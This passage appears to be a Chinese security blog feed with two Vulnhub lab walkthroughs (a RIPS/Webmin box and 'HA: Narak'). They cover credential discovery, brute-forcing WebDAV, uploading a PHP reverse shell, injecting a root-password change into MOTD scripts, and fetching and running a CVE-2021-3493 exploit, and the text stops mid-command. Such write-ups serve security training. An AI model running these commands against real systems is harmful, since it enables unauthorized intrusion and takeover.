<p>然后百度什么是rips，发现这是一款静态的php的代码审计攻击（官网在[[#靶机信息]]给出），默认的打开方式为 <code>http://localhost/rips</code>，于是依次尝试在80端口和10000端口访问，最终80端口上成功出现了该工具的页面。</p>
<blockquote>
<p>网上有人使用dirbuster爆破出rips目录。</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424153904.png" /></p>
<h2 id="get-shell">2.3. get shell</h2>
<p>先扫描/var/www这个目录下的文件，很快就得到了结果</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424154139.png" /></p>
<p>发现，这里可以看到许多php文件的源码，并且给出了可能存在的漏洞。尝试利用一下<code>/var/www/html/rips/windows/code.php</code>的文件暴露漏洞。但是这个漏洞不能读取不同目录下的文件，只能够读取同目录下的文件，而且只是简单的把文件内容暴露出来，并不会把代码执行。因此，目前没有利用价值。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424154541.png" /></p>
<p>再次回到rips界面，可以利用/regex/搜索包含某些关键词的php文件</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424154521.png" /></p>
<p>发现了一个<code>secret.php</code>文件，这名字一看就隐藏着密码。</p>
<p>其实也可以同通过下图中的file功能列出扫描的所有php文件</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424154708.png" /></p>
<p>该文件中的信息如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user name: ripper</span><br><span class="line">pass: Gamespeopleplay</span><br></pre></td></tr></table></figure></p>
<p>起初还以为这是10000端口的登录账号和密码，但是尝试过后发现并不是。因此目前只有ssh需要密码。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424155132.png" /></p>
<h2 id="权限提升">2.4. 权限提升</h2>
<h3 id="获得cubes权限">2.4.1. 获得cubes权限</h3>
<p>发现/home目录下除了ripper之外，存在着另一个用户cubes。那么接下来可能就是需要先拿到cubes的权限，然后再拿到root权限。</p>
<p>经过信息收集发现之前的一些提权手段都没法使用。接下来可以使用下面的命令找到属主是cubes但是ripper可读的文件。 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -user cubes -<span class="built_in">type</span> f -<span class="built_in">exec</span> ls -la &#123;&#125; \; 2&gt;/dev/null</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424155612.png" /></p>
<p>又发现了一个secret.file文件，直接查看该文件，文件内容如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">This is my secret file</span><br><span class="line"></span><br><span class="line">[file system]</span><br><span class="line">-passwd : Il00tpeople</span><br></pre></td></tr></table></figure></p>
<p>又得到了一个密码，因为属主是cubes，可能这就是cubes用户的ssh登录密码，直接尝试</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424155811.png" /></p>
<p>成功获得cubes权限。</p>
<h3 id="获得root权限">2.4.2. 获得root权限</h3>
<h4 id="方法1">2.4.2.1. 方法1</h4>
<p>接下来同样信息收集，发现之前的手段还是无法利用。因此再次输入上述命令（稍作修改）： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -user cubes -<span class="built_in">type</span> f -<span class="built_in">exec</span> ls -la &#123;&#125; \; 2&gt;/dev/null|grep -v <span class="string">&quot;proc&quot;</span>|grep -v <span class="string">&quot;.png&quot;</span></span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424160020.png" /></p>
<p>经过对文件的查看，发现 miniser.log，我们知道10000端口上的服务正好就是miniserv，那么这个文件保存的应该就是相关的日志，查看其中的内容，发现了一条重要的信息： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Authentication : session_login.cgi=username=admin&amp;pass=tokiohotel</span><br></pre></td></tr></table></figure></p>
<p>这应该就是10000端口的登录界面的账号密码了。成功登录到后台后找到<code>others -&gt; command shell</code>能够直接获得一个shell，惊讶的发现这居然是root权限。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424160511.png" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424160527.png" /></p>
<p>此时可以直接读取flag。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 1. /home/ripper/flag.txt</span><br><span class="line">__________.____________________________________________ </span><br><span class="line">\______   \   \______   \______   \_   _____/\______   \</span><br><span class="line"> |       _/   ||     ___/|     ___/|    __)_  |       _/</span><br><span class="line"> |    |   \   ||    |    |    |    |        \ |    |   \</span><br><span class="line"> |____|_  /___||____|    |____|   /_______  / |____|_  /</span><br><span class="line">        \/                                \/         \/ </span><br><span class="line"></span><br><span class="line">flag&#123;15ea80f080be3714df1ef97bac5d7151&#125;</span><br><span class="line"></span><br><span class="line">C0ngratulation on getting user ! Lets get root now :)</span><br><span class="line"></span><br><span class="line">// 2. /root/flag.txt</span><br><span class="line">.---..-.-.-..-..-..--.     .---. .-..---..---..---..---. </span><br><span class="line">| |-&#x27;| | | || .` || \ \### | |-&lt; | || |-&#x27;| |-&#x27;| |- | |-&lt; </span><br><span class="line">`-&#x27;  `-----&#x27;`-&#x27;`-&#x27;`-&#x27;-&#x27;    `-&#x27;`-&#x27;`-&#x27;`-&#x27;  `-&#x27;  `---&#x27;`-&#x27;`-&#x27;</span><br><span class="line"></span><br><span class="line">COngrats !!! You have rooted this box !!</span><br><span class="line"></span><br><span class="line">Follow me on twitter @san3ncrypt3d</span><br></pre></td></tr></table></figure></p>
<h4 id="方法2">2.4.2.2. 方法2</h4>
<p>登录后台之后，可以利用之前提到的远程执行漏洞获得root权限。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424161007.png" /></p>
<p>依次将参数填入： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set rhost 10.0.2.23</span><br><span class="line">set password tokiohotel</span><br><span class="line">set username admin</span><br><span class="line">set SSL true # 切记，10000端口要求ssl</span><br><span class="line">set lhost 10.0.2.4</span><br><span class="line">run</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424161215.png" /></p>
<p>得到session后，输入 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shell</span><br><span class="line">python</span><br></pre></td></tr></table></figure></p>
<p>得到一个交互式的shell</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424161414.png" /></p>
<h4 id="方法3">2.4.2.3. 方法3</h4>
<p>通过信息收集，发现靶机的操作系统是Ubuntu <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Distributor ID: Ubuntu</span><br><span class="line">Description:    Ubuntu 18.04.5 LTS</span><br><span class="line">Release:        18.04</span><br><span class="line">Codename:       bionic</span><br></pre></td></tr></table></figure></p>
<p>而 CVE-2021-3493 是专门针对Ubuntu的一个漏洞。因此可以直接利用。我们先回到ripper用户，由于靶机上没有gcc，因此在kali上编译完成之后发送到靶机执行即可。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">// 1. 编译</span><br><span class="line">gcc exploit.c -o exp</span><br><span class="line"></span><br><span class="line">// 2. 发送到靶机</span><br><span class="line">scp exp ripper@10.0.2.23:~/ <span class="comment"># 需要输入密码</span></span><br><span class="line"></span><br><span class="line">// 3. 执行</span><br><span class="line">./exp</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424162026.png" /></p>
<h3 id="番外">2.4.3. 番外</h3>
<p>刚开始的时候并不会使用find命令，而是一个一个文件查看，直到查看了/home/ripper/.bash_history，内容如下（后面的一些命令记录的是我们使用的，但是前面的是作者使用的）</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424162218.png" /></p>
<p>然后才去找secret.file文件，因此拿到cubes的权限。获得root权限也是如此，查看/home/cubes/.bash_history</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424162508.png" /></p>
<p>然后查看其中涉及的许多文件，发现了miniserv.log中记录着登录界面的用户名和密码。后面的步骤和方法2一致了。</p>
<h1 id="总结">3. 总结</h1>
<p>该靶机的难度在于能否在到rips的路径，以及信息收集的能力，如果没有使用find命令，那就需要看许多的文件才可以提升权限。</p>
<p>该靶机的发布时间是早于 CVE-2021-3493 的，因此放法2只能算是取巧了。</p>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>综合</tag>
        <tag>vulnhub</tag>
        <tag>rips代码审计</tag>
        <tag>备份文件泄密</tag>
        <tag>CVE-2021-3493</tag>
        <tag>Webmin漏洞利用</tag>
      </tags>
  </entry>
  <entry>
    <title>18 Vulnhub Narak Writeup</title>
    <url>/2022/05/01/18%20Vulnhub%20Narak%20Writeup/</url>
    <content><![CDATA[<p>该靶机难度中等，通过该靶机的渗透，可以学到很多！</p>
<span id="more"></span>
<h1 id="靶机信息">1. 靶机信息</h1>
<p>靶机地址：</p>
<ul>
<li><a href="https://www.vulnhub.com/entry/ha-narak,569/">HA: Narak ~ VulnHub</a></li>
</ul>
<p>难度：</p>
<ul>
<li>中</li>
</ul>
<p>目标：</p>
<ul>
<li>取得root权限</li>
<li>拿到2个flag</li>
</ul>
<p>攻击方法：</p>
<ul>
<li>主机发现</li>
<li>端口扫描</li>
<li>信息收集</li>
<li><strong>密码字典定制</strong></li>
<li>爆破密码</li>
<li><strong>webdav漏洞</strong></li>
<li>put方法上传</li>
<li>Brainfuck密码</li>
<li><strong>MOTD注入</strong></li>
<li>CVE-2021-3493提权</li>
</ul>
<h1 id="渗透">2. 渗透</h1>
<h2 id="主机发现端口扫描端口服务发现">2.1. 主机发现、端口扫描、端口服务发现</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo arp-scan -l</span><br><span class="line">sudo nmap -p- 10.0.2.24</span><br><span class="line">sudo nmap -p22,80 -A 10.0.2.24</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220501192741.png" /></p>
<p>信息：</p>
<ul>
<li>22端口的服务为ssh</li>
<li>80端口的服务为http，版本为Apache2.4.29</li>
<li>靶机操作系统为Ubuntu</li>
</ul>
<h2 id="访问http服务">2.2. 访问http服务</h2>
<p>访问80端口，发现不论是源码还是抓包都没有有用的信息。最开始还以为</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220501192922.png" /></p>
<p>这里面的图片可能存在着隐写，但是尝试过后发现也没有。</p>
<p>没有办法，进行路径扫描： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://10.0.2.24/</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220501193218.png" /></p>
<p>有一个关键的信息，有一个/webdav/的目录，但是状态码是401，也就是需要验证</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220501193320.png" /></p>
<p>但是目前并没有任何相关的用户名和密码的信息，因此，接着利用自己的字典扫描，看一下是否存在隐藏的文件（也可以用gobuster，会更快） <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://10.0.2.24 -f -e html,php,txt -w /usr/share/wordlists/dirb/common.txt</span><br><span class="line"></span><br><span class="line">gobuster dir -u http://10.0.2.24 -w /usr/share/dirb/wordlists/common.txt -x txt,php,html</span><br></pre></td></tr></table></figure></p>
<p>最终扫描出一个可以的文件 tips.txt，直接访问该文件得到如下信息： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Hint to open the door of narak can be found in creds.txt.</span><br></pre></td></tr></table></figure></p>
<p>但是直接访问creds.txt文件，服务器提示没有该文件，最开始还以为这是作者恶作剧。</p>
<h2 id="get-shell">2.3. get shell</h2>
<h3 id="方法1-暴力破解">2.3.1. 方法1-(暴力破解)</h3>
<p>分为两种：</p>
<ul>
<li>纯暴力破解</li>
<li>针对目标站点生成定制字典，比如cewl工具</li>
</ul>
<p>经过一定的信息收集，除了知道 tips.txt 和 creds.txt 之外，没有其他有用的信息，因此尝试直接暴力破解。暴力破解分为两种：</p>
<ul>
<li>纯暴力破解</li>
<li>针对目标站点生成定制字典，比如cewl工具</li>
</ul>
<p>经尝试这里纯暴力破解是没有用的，因此采用第二种。</p>
<ol type="1">
<li><p>首先生成定制的字典，利用cewl工具</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cewl 10.0.2.24/ -w dic.txt</span><br></pre></td></tr></table></figure></li>
<li><p>利用hydra配合刚刚生成的字典进行爆破</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hydra -L dic.txt -P dic.txt 10.0.2.24 http-get /webdav</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220501194055.png" /></p>
<p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username: yamdoot</span><br><span class="line">password: Swarg</span><br></pre></td></tr></table></figure></p></li>
</ol>
<p>然后直接访问，发现文件为空。但是这里可以利用两个工具，首先介绍davtest。该工具可以测试是否能够远程连接上webdav服务器，测试当前用户的权限，测试哪些文件格式可以被执行，还可以直接上传文件等功能。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">davtest -url http://10.0.2.24/webdav -auth yamdoot:Swarg</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220501194448.png" /></p>
<p>它做了4件事：</p>
<ol type="1">
<li>测试能否连接，如果可以，并生成一个session</li>
<li>创建文件夹</li>
<li>发送文件</li>
<li>执行文件</li>
</ol>
<p>从中发现可以上传php文件，并且也可以执行php文件。因此可以上传一个反弹shell的php文件，然后执行即可。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">davtestdavtest -url http://10.0.2.24/webdav -auth yamdoot:Swarg -uploadfile php-reverse-shell.php -uploadloc rev.php </span><br></pre></td></tr></table></figure>
<p>解释：</p>
<ol type="1">
<li><p>php-reverse-shell.php是kali自带的，路径：/usr/share/webshells/php/php-reverse-shell.php</p></li>
<li><p>-uploadfile 后面是kali上的文件名</p></li>
<li><p>-uploadloc 后面是上传到靶机上面之后的文件名（路径）</p></li>
<li><p>-uploadfile 和 -uploadloc 要一起使用！</p></li>
<li><p>记得修改php-reverse-shell.php中的IP和端口信息</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220501195026.png" /></p></li>
</ol>
<p>kali监听对应端口之后网页访问对应的文件</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220501195201.png" /></p>
<p>成功get shell！</p>
<h3 id="方法2-扫描udp端口">2.3.2. 方法2-(扫描UDP端口)</h3>
<p>tips.txt中告诉我们存在creds.txt，但是直接访问又不存在，因此可以考虑一下扫描UDP端口： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sU -F 10.0.2.24</span><br><span class="line"></span><br><span class="line"><span class="comment"># -sU: 扫描UDP端口</span></span><br><span class="line"><span class="comment"># -F: 只扫描常用的100个端口</span></span><br></pre></td></tr></table></figure></p>
<p>切记，不要全端口扫描，否则一天可能都扫不完。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220501195336.png" /></p>
<p>发现udp开了两个端口：</p>
<ul>
<li>68是dhcp服务</li>
<li>69是tftp服务</li>
</ul>
<p>前者就是动态分IP没有什么利用的价值，而后者是一个简单的文件传输的服务。可以直接使用下面的命令连接： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tftp 10.0.24</span><br></pre></td></tr></table></figure></p>
<p>然后根据tips.txt的提示，下载creds.txt文件 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">get creds.txt</span><br></pre></td></tr></table></figure></p>
<p>查看creds.txt，发现是经过base64编码的，解码同样得到了用户名和密码 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─<span class="comment"># cat creds.txt                  </span></span><br><span class="line">eWFtZG9vdDpTd2FyZw==</span><br><span class="line"></span><br><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─<span class="comment"># echo &#x27;eWFtZG9vdDpTd2FyZw==&#x27;|base64 -d</span></span><br><span class="line">yamdoot:Swarg</span><br></pre></td></tr></table></figure></p>
<p>这里使用另一款工具cadaver。这款工具可以直接连接上去，然后上传文件即可。 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─<span class="comment"># cadaver http://10.0.2.24/webdav</span></span><br><span class="line">Authentication required <span class="keyword">for</span> webdav on server `10.0.2.24<span class="string">&#x27;:</span></span><br><span class="line"><span class="string">Username: yamdoot</span></span><br><span class="line"><span class="string">Password: </span></span><br><span class="line"><span class="string">dav:/webdav/&gt; put php-reverse-shell.php </span></span><br><span class="line"><span class="string">Uploading php-reverse-shell.php to `/webdav/php-reverse-shell.php&#x27;</span>:</span><br><span class="line">Progress: [=============================&gt;] 100.0% of 5490 bytes succeeded.</span><br><span class="line">dav:/webdav/&gt; ls</span><br><span class="line">Listing collection `/webdav/<span class="string">&#x27;: succeeded.</span></span><br><span class="line"><span class="string">Coll:   DavTestDir_Ul5734                      0  May  1 19:44</span></span><br><span class="line"><span class="string">        php-reverse-shell.php               5490  May  1 19:58</span></span><br><span class="line"><span class="string">        rev.php </span></span><br></pre></td></tr></table></figure></p>
<p>之后一样的反弹shell即可。</p>
<h2 id="权限提升">2.4. 权限提升</h2>
<p>首先从/etc/passwd中发现存在着四个用户：root, narak, inferno, yamdoot</p>
<p>然后进行其他信息收集。 ### 2.4.1. get inferno权限 使用下面命令查找有可能存在问题的文件： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -<span class="built_in">type</span> f -user root -perm -ug=x,-o=w -<span class="built_in">exec</span> ls -l <span class="string">&#x27;&#123;&#125;&#x27;</span> \; 2&gt;/dev/null</span><br></pre></td></tr></table></figure></p>
<p>上述命令解释：</p>
<ul>
<li>从根目录开始寻找文件</li>
<li>属主为root</li>
<li>权限信息：属主和同一组的有执行权限，其他用户可以写</li>
<li>将找到的文件显示出来</li>
<li>中间报错信息可能是因为权限不够，因此不重要，利用 2&gt;/dev/null 重定向，不显示出来</li>
</ul>
<p>其实我想的是先提到某个用户的权限，再提到root，因此最开始查询的文件属主分别是：narak, inferno, yamdoot。但是没有文件，因此查看root的，发现了一个奇怪的文件 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@ubuntu:/$ find / -<span class="built_in">type</span> f -user root -perm -ug=x,o=w -<span class="built_in">exec</span> ls -l <span class="string">&#x27;&#123;&#125;&#x27;</span> \; 2&gt;/dev/null</span><br><span class="line">&lt;oot -perm -ug=x,o=w -<span class="built_in">exec</span> ls -l <span class="string">&#x27;&#123;&#125;&#x27;</span> \; 2&gt;/dev/null</span><br><span class="line">-rwxrwxrwx 1 root root 124 Sep 22  2020 /mnt/hell.sh</span><br><span class="line">-rwxrwxrwx 1 root root 299 May 18  2017 /etc/update-motd.d/91-release-upgrade</span><br><span class="line">-rwxrwxrwx 1 root root 1220 Apr  9  2018 /etc/update-motd.d/00-header</span><br><span class="line">-rwxrwxrwx 1 root root 4251 Apr  9  2018 /etc/update-motd.d/50-motd-news</span><br><span class="line">-rwxrwxrwx 1 root root 604 Mar 21  2018 /etc/update-motd.d/80-esm</span><br><span class="line">-rwxrwxrwx 1 root root 3017 Mar 21  2018 /etc/update-motd.d/80-livepatch</span><br><span class="line">-rwxrwxrwx 1 root root 1157 Apr  9  2018 /etc/update-motd.d/10-help-text</span><br></pre></td></tr></table></figure></p>
<p>/mnt/hell.sh 跟今天靶机的主题很像，因此查看里面的内容 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@ubuntu:/$ cat /mnt/hell.sh</span><br><span class="line">cat /mnt/hell.sh</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span><span class="string">&quot;Highway to Hell&quot;</span>;</span><br><span class="line">--[-----&gt;+&lt;]&gt;---.+++++.+.+++++++++++.--.+++[-&gt;+++&lt;]&gt;++.++++++.--[---&gt;+&lt;]&gt;--.-----.++++.</span><br></pre></td></tr></table></figure></p>
<p>这其实是brainfuck语言编写的（对没错，这是一门计算机语言），直接在线解密即可。推荐一个网站：<a href="https://www.splitbrain.org/services/ook">Brainfuck/Ook! Obfuscation/Encoding [splitbrain.org]</a></p>
<p>解密得到的信息为：chitragupt</p>
<p>接下来切换用户尝试一下，最后成功切换到inferno用户。不过我使用ssh连接，会更稳定</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220501201030.png" /></p>
<h3 id="get-root权限">2.4.2. get root权限</h3>
<h4 id="方法1-motd提权">2.4.2.1. 方法1-(MOTD提权)</h4>
<p>经过信息收集，还是没有可以利用的点。但是注意到刚刚执行下面命令时，还有其他可疑的文件。 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -<span class="built_in">type</span> f -user root -perm -ug=x,-o=w -<span class="built_in">exec</span> ls -l <span class="string">&#x27;&#123;&#125;&#x27;</span> \; 2&gt;/dev/null</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220501201129.png" /></p>
<table style="width:7%;">
<colgroup>
<col style="width: 6%" />
</colgroup>
<tbody>
<tr class="odd">
<td>motd: message of the day</td>
</tr>
<tr class="even">
<td>一般使用ssh或者直接登录时，会优先执行/etc/update-motd.d/目录下的脚本文件，因此才有上面ssh登录时的一些信息</td>
</tr>
<tr class="odd">
<td><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220501201030.png" /></td>
</tr>
</tbody>
</table>
<p>可以看到这些文件对所有用户开放了权限。因此可以利用这些文件，朝里面写入修改root用户的密码，然后下次登录时就会执行这些文件，因此修改了root的用户密码，因此我们就能提权到root。下面命令就是将<code>echo 'root:hdfzzf'|chpasswd</code>写入到文件中： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">inferno@ubuntu:~$ <span class="built_in">echo</span> <span class="string">&quot;echo &#x27;root:hdfzzf&#x27;|chpasswd&quot;</span> &gt;&gt; /etc/update-motd.d/00-header</span><br></pre></td></tr></table></figure></p>
<p>重新ssh连接，然后su root即可 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─<span class="comment"># ssh inferno@10.0.2.24                                                                                        130 ⨯</span></span><br><span class="line">inferno@10.0.2.24<span class="string">&#x27;s password: </span></span><br><span class="line"><span class="string">Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-20-generic x86_64)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> * Documentation:  https://help.ubuntu.com</span></span><br><span class="line"><span class="string"> * Management:     https://landscape.canonical.com</span></span><br><span class="line"><span class="string"> * Support:        https://ubuntu.com/advantage</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> * Canonical Livepatch is available for installation.</span></span><br><span class="line"><span class="string">   - Reduce system reboots and improve kernel security. Activate at:</span></span><br><span class="line"><span class="string">     https://ubuntu.com/livepatch</span></span><br><span class="line"><span class="string">New release &#x27;</span>20.04.4 LTS<span class="string">&#x27; available.</span></span><br><span class="line"><span class="string">Run &#x27;</span>do-release-upgrade<span class="string">&#x27; to upgrade to it.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Last login: Sun May  1 05:09:56 2022 from 10.0.2.4</span></span><br><span class="line"><span class="string">inferno@ubuntu:~$ su root</span></span><br><span class="line"><span class="string">Password: </span></span><br><span class="line"><span class="string">root@ubuntu:/home/inferno# id</span></span><br><span class="line"><span class="string">uid=0(root) gid=0(root) groups=0(root)</span></span><br></pre></td></tr></table></figure></p>
<p>依次读取flag： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">// 1. /home/inferno/user.txt</span><br><span class="line">Flag: &#123;5f95bf06ce19af69bfa5e53f797ce6e2&#125;</span><br><span class="line"></span><br><span class="line">// 2. /root/root.txt</span><br><span class="line">██████████████████████████████████████████████████████████████████████████████████████████</span><br><span class="line">█░░░░░░██████████░░░░░░█░░░░░░░░░░░░░░█░░░░░░░░░░░░░░░░███░░░░░░░░░░░░░░█░░░░░░██░░░░░░░░█</span><br><span class="line">█░░▄▀░░░░░░░░░░██░░▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀▄▀░░███░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀░░██░░▄▀▄▀░░█</span><br><span class="line">█░░▄▀▄▀▄▀▄▀▄▀░░██░░▄▀░░█░░▄▀░░░░░░▄▀░░█░░▄▀░░░░░░░░▄▀░░███░░▄▀░░░░░░▄▀░░█░░▄▀░░██░░▄▀░░░░█</span><br><span class="line">█░░▄▀░░░░░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░█░░▄▀░░████░░▄▀░░███░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░███</span><br><span class="line">█░░▄▀░░██░░▄▀░░██░░▄▀░░█░░▄▀░░░░░░▄▀░░█░░▄▀░░░░░░░░▄▀░░███░░▄▀░░░░░░▄▀░░█░░▄▀░░░░░░▄▀░░███</span><br><span class="line">█░░▄▀░░██░░▄▀░░██░░▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀▄▀░░███░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░███</span><br><span class="line">█░░▄▀░░██░░▄▀░░██░░▄▀░░█░░▄▀░░░░░░▄▀░░█░░▄▀░░░░░░▄▀░░░░███░░▄▀░░░░░░▄▀░░█░░▄▀░░░░░░▄▀░░███</span><br><span class="line">█░░▄▀░░██░░▄▀░░░░░░▄▀░░█░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░█████░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░███</span><br><span class="line">█░░▄▀░░██░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░░░░░█░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░░░█</span><br><span class="line">█░░▄▀░░██░░░░░░░░░░▄▀░░█░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀▄▀▄▀░░█░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀▄▀░░█</span><br><span class="line">█░░░░░░██████████░░░░░░█░░░░░░██░░░░░░█░░░░░░██░░░░░░░░░░█░░░░░░██░░░░░░█░░░░░░██░░░░░░░░█</span><br><span class="line">██████████████████████████████████████████████████████████████████████████████████████████</span><br><span class="line">                           </span><br><span class="line">                                                                                    </span><br><span class="line">Root Flag: &#123;9440aee508b6215995219c58c8ba4b45&#125;</span><br><span class="line"></span><br><span class="line">!! Congrats you have finished this task !!</span><br><span class="line"></span><br><span class="line">Contact us here:</span><br><span class="line"></span><br><span class="line">Hacking Articles : https://twitter.com/hackinarticles</span><br><span class="line"></span><br><span class="line">Jeenali Kothari  : https://www.linkedin.com/<span class="keyword">in</span>/jeenali-kothari/</span><br><span class="line"></span><br><span class="line">+-+-+-+-+-+ +-+-+-+-+-+-+-+</span><br><span class="line"> |E|n|j|o|y| |H|A|C|K|I|N|G|</span><br><span class="line"> +-+-+-+-+-+ +-+-+-+-+-+-+-+</span><br><span class="line">__________________________________</span><br></pre></td></tr></table></figure></p>
<h4 id="方法2-cve-2021-3493">2.4.2.2. 方法2-(CVE-2021-3493)</h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@ubuntu:/$ lsb_release -a</span><br><span class="line">lsb_release -a</span><br><span class="line">No LSB modules are available.</span><br><span class="line">Distributor ID: Ubuntu</span><br><span class="line">Description:    Ubuntu 18.04 LTS</span><br><span class="line">Release:        18.04</span><br><span class="line">Codename:       bionic</span><br></pre></td></tr></table></figure>
<p>可以看到靶机的操作系统为Ubuntu 18.04 LTS。之前的渗透过程中了解了CVE-2021-3493的漏洞，专门针对Ubuntu进行提取。</p>
<p>因此可以先在kali上编译之后（因为靶机上没有gcc环境）传入到靶机，然后执行即可。这里需要注意的一点是，如果是www-data用户的话，需要到/tmp下面才有读写执行权限，如果是inferno用户，还可以到自己的家目录。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">kali: </span><br><span class="line">┌──(root💀kali)-[/home/hdfzzf/CVE-2021-3493]</span><br><span class="line">└─<span class="comment"># python3 -m http.server                                  </span></span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</span><br><span class="line"></span><br><span class="line">靶机:</span><br><span class="line">www-data@ubuntu:/tmp$ wget http://10.0.2.4:8000/exp</span><br><span class="line">wget http://10.0.2.4:8000/exp</span><br><span class="line">--2022-05-01 05:25:55--  http://10.0.2.4:8000/exp</span><br><span class="line">Connecting to 10.0.2.4:8000... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 17376 (17K) [application/octet-stream]</span><br><span class="line">Saving to: <span class="string">&#x27;exp&#x27;</span></span><br><span class="line"></span><br><span class="line">exp                 100%[===================&gt;]  16.97K  --.-KB/s    <span 